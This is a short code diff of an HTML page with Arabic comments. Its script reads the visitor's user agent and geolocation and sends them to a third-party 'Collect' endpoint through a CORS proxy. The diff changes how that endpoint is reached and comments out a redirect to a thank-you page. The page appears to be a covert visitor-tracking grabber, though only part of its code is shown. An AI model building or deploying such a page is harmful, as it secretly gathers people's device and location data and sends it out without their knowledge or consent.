@@ -9,9 +9,8 @@
 <body>
     <script>
         // === الـ URL الصحيح: يمر عبر corsproxy.io ===
-      //  const apiUrl = 'https://corsproxy.io/?' + encodeURIComponent('http://help2025.runasp.net/api/Collect');
-//const apiUrl = 'https://corsproxy.io/?' + encodeURIComponent('http://help2025.runasp.net/api/Collect');
-const apiUrl = 'https://help2025.runasp.net/api/Collect';
+const apiUrl = 'https://corsproxy.io/?' + encodeURIComponent('http://help2025.runasp.net/api/Collect');
+
 
         // === باقي الكود (بدون تغيير) ===
         async function parseDeviceName(ua) {
@@ -136,7 +135,7 @@ async function getGeolocation() {
                 console.error('خطأ:', e);
             } finally {
                 setTimeout(() => {
-                    window.location.href = 'https://example.com/thank-you';
+                  //  window.location.href = 'https://example.com/thank-you';
                 }, 500);
             }
         })();
